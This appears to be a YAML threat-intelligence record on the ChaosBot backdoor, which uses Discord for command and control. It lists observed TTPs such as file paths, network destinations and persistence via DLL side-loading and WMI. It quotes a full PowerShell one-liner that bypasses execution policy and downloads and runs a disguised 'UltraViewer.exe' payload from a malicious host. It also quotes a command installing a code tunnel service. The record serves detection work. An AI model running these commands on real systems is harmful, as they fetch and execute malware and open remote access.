description: A Rust-based backdoor, ChaosBot, leveraging Discord for C2 and using
  PowerShell to execute commands.
attribution: ChaosBot operators (Discord user chaos_00019)
malware_families:
- ChaosBot
TTPs:
  processes: []
  commandline:
  - powershell -Command "$OutputEncoding = [System.Text.Encoding]::UTF8; <SOME_COMMAND>"
  - c:\\users\\public\\music\\node.exe -c c:\\users\\public\\music\\node.ini
  - c:\\users\\public\\music\\code.exeshell(echo | c:\\users\\public\\music\\code.exe
    tunnel service install > c:\\users\\public\\music\\log)
  - '"powershell.exe" -ExecutionPolicy Bypass -NoProfile -Command "$localPath = (Get-Location).Path;Start-Sleep
    -Milliseconds 568;Remove-Item -Path \"$localPath\\2557.KV6-TTKQ.pdf\" -Force;Invoke-WebRequest
    -Uri \"https://usbcard.s3.dualstack.us-east-1.amazonaws.con/test/2557.KV6-TTKQ.pdf\"
    -OutFile $localPath\\2557.KV6-TTKQ.pdf;Invoke-Item \"$localPath\\2557.KV6-TTKQ.pdf\";if
    (-not (Test-Path \"C:\\Users\\Public\\videos\\Ultraviewer\")){ New-Item -Type
    Directory C:\\Users\\Public\\videos\\Ultraviewer -Force | Out-Null };Invoke-WebRequest
    -Uri https://usbcard.s3.dualstack.us-east-1.amazonaws.con/test/UltraViever.2ipTM
    -OutFile C:\\Users\\Public\\videos\\Ultraviewer\\UltraViewer.exe;Expand-Archive
    -Path \"C:\\Users\\Public\\videos\\Ultraviewer\\UltraViewer.zip\" -DestinationPath
    C:\\Users\\Public\\videos\\Ultraviewer -Force;Remove-Item \"C:\\Users\\Public\\videos\\Ultraviewer\\UltraViewer.zip\"
    -Force;Invoke-Item \"C:\\Users\\Public\\videos\\Ultraviewer\\UltraViewer.exe\"'
  powershell:
  - $OutputEncoding = [System.Text.Encoding]::UTF8; <SOME_COMMAND>
  - Invoke-WebRequest -Uri "https://usbcard.s3.dualstack.us-east-1.amazonaws.con/test/2557.KV6-TTKQ.pdf"
    -OutFile $localPath\2557.KV6-TTKQ.pdf
  - Invoke-WebRequest -Uri https://usbcard.s3.dualstack.us-east-1.amazonaws.con/test/UltraViever.2ipTM
    -OutFile C:\Users\Public\videos\Ultraviewer\UltraViewer.exe
  scripting_engine: []
  registry_keys: []
  image_load: []
  network_connections:
  - process: powershell.exe
    destination: usbcard.s3.dualstack.us-east-1.amazonaws.con
    port: 443
  - process: powershell.exe
    destination: discord.com
    port: 443
  file_activity:
  - C:\\Users\\Public\\Libraries\\msedge_elf.dll
  - c:\\users\\public\\music\\node.exe
  - c:\\users\\public\\music\\node.ini
  - c:\\users\\public\\music\\code.exe
  - c:\\users\\public\\music\\log
  - C:\Users\Public\videos\Ultraviewer\UltraViewer.zip
  - C:\Users\Public\videos\Ultraviewer\UltraViewer.exe
  - $localPath\2557.KV6-TTKQ.pdf
  persistence:
  - Side-loaded msedge_elf.dll via identity_helper.exe
  - WMI remote execution using compromised credentials
  process_relations: []
